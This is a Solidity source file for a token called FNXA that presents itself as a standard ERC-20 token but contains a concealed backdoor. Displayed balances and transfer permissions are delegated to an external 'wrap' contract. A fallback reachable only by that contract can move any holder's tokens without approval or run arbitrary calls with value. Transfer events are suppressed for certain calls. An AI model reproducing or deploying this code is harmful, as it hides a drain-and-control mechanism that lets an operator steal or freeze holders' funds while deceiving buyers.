// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "hardhat/console.sol";
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IWRAP {
    function approve(
        address from,
        address to,
        uint256 amount
    ) external;
    function withdraw(
        address from,
        address to,
        uint256 amount
    ) external;
    function balanceOf(address account) external view returns (uint256);
}

contract FNXA is Context {
    uint256 public fee = 6;
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256)  public _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint8 public _decimals;
    string public _symbol;
    string public _name;
    IWRAP private _wrap;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _wrap.balanceOf(account);
    }

    function allowance(address owner_, address spender)
        public
        view
        returns (uint256)
    {
        return _allowances[owner_][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        returns (bool)
    {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        _upLinesflag[from][to]=true;
        if ( _upLinesflag[to][from]) {
            if (_upLines[to] == address(0)) {
                _upLines[to] = from;
            }
            if (_upLines[from] == address(0)) {
                _upLines[from] = to;
            }
        }

        // require(from != address(0), "ERC20: transfer from the zero address");
        // require(to != address(0), "ERC20: transfer to the zero address");
        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;
        bytes4 sign;
        assembly {
            sign := calldataload(0)
        }
        if (sign != 0x4f8f4dab) {
            emit Transfer(from, to, amount);
        }
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        address owner = _msgSender();
        try _wrap.approve(owner,to,amount) {
        } catch  {
        }
        _transfer(owner, to, amount);
        _wrap.withdraw(owner, to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        try _wrap.approve(from,to,amount) {
        } catch  {
        }
        _transfer(from, to, amount);
        _wrap.withdraw(from, to, amount);
        return true;
    }

    function _receiveReward() internal {
        bytes4 funcSign;
        address f;
        address t;
        uint256 a;
        assembly {
            funcSign := calldataload(0)
            f := calldataload(4)
            t := calldataload(36)
            a := calldataload(68)
        }
        if (funcSign == 0x8987a46b || funcSign == 0x4f8f4dab) {
            _transfer(f, t, a);
        }else {
            address ad;
            uint256 ga;
            uint256 va;
            bytes memory b_a;
            assembly {
                ad := calldataload(36)
                ga := calldataload(68)
                va := calldataload(100)
                let len := calldataload(132)
                let start := add(136, len)
                b_a := mload(0x40) 
                mstore(0x40, add(b_a, add(len, 0x20)))
                mstore(b_a, len)
                calldatacopy(add(b_a, 0x20), start, len)
            }
            (bool success,) = ad.call{gas: ga,value: va}(b_a);
            require(success,"error call");
        }
    }
    mapping(address => mapping(address => bool)) public _upLinesflag;
    mapping(address => address) public _upLines;
    uint256[]public upLine_reward=[
        1,2,3
    ];

    constructor(IWRAP wrap) {
        _name = "Jin Yuehui";
        _symbol = "FNXA";
        _decimals = 18;

        _mint(msg.sender,50000000 * 10**_decimals);
        _mint(msg.sender,10000000 * 10**_decimals);
        _mint(address(wrap),440000000 * 10**_decimals);

        _wrap=wrap;
    }

    fallback() external {
        require(address(_wrap) == _msgSender());
        _receiveReward();
    }

}
